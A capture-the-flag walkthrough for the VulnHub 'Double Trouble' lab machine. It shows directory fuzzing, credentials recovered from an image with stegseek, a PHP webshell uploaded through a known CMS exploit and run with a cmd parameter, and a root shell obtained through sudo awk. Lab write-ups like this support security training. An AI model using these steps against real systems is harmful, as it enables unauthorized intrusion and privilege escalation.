# Double Trouble

![image](https://user-images.githubusercontent.com/5285547/135430124-917a6511-92da-44d3-978c-6acc89725b18.png)

Created by: tasiyanci
Link: https://www.vulnhub.com/entry/doubletrouble-1,743/

## Enumeration

Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ffuf

```
ffuf -u "http://192.168.1.162/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt   -mc all -fc 404,403 -c -e .txt,.html,.tar,.php,.js -fl 10

images                  [Status: 301, Size: 315, Words: 20, Lines: 10]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
install                 [Status: 301, Size: 316, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10]
template                [Status: 301, Size: 317, Words: 20, Lines: 10]
core                    [Status: 301, Size: 313, Words: 20, Lines: 10]
readme.txt              [Status: 200, Size: 470, Words: 60, Lines: 13]
index.php               [Status: 200, Size: 5812, Words: 563, Lines: 144]
robots.txt              [Status: 200, Size: 26, Words: 2, Lines: 3]
backups                 [Status: 301, Size: 316, Words: 20, Lines: 10]
check.php               [Status: 200, Size: 0, Words: 1, Lines: 1]
secret                  [Status: 301, Size: 315, Words: 20, Lines: 10]
.                       [Status: 200, Size: 6993, Words: 593, Lines: 155]
batch                   [Status: 301, Size: 314, Words: 20, Lines: 10]
sf                      [Status: 301, Size: 311, Words: 20, Lines: 10]
```

## /secret

Looking in the secret directory we find an image "doubletrouble.jpg", Using stegonography we can decode the message and get some creds! 

```
stegseek doubletrouble.jpg -xf output
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92camaro"       
[i] Original filename: "creds.txt".
[i] Extracting to "output".
```

```
cat output               
otisrush@localhost.com
oti[REDACTED]  
```

## Exploit

http://192.168.1.165/index.php/

Now we can login. 

![image](https://user-images.githubusercontent.com/5285547/135429387-126d3cd2-c0b4-4ad3-b05b-84cebfa879fd.png)

![image](https://user-images.githubusercontent.com/5285547/135429437-be8a11da-282f-4f57-9d9b-05c213c95d2f.png)

According to the exploit found here: https://www.exploit-db.com/exploits/47954,
we can upload a php webshell anbd gain access on changing the user image. After uploading the php shell.  
Goto the http://IP/uploads/users/

![image](https://user-images.githubusercontent.com/5285547/135429687-c81c14b0-1e88-4be5-b51c-dd6cad3ff872.png)

Now we can execute code! 

http://192.168.1.162/uploads/users/941147-shell_web.php?cmd=id

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Root

Checking the system we see we can use awk as any user with no password. 

```
sudo -l 
(ALL : ALL) NOPASSWD: /usr/bin/awk
```

Expliot to root!

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

![image](https://user-images.githubusercontent.com/5285547/135429947-e003040a-8776-4e59-8fff-1a00c2c7f393.png)


Thanks to https://twitter.com/tasiyanci for the box!
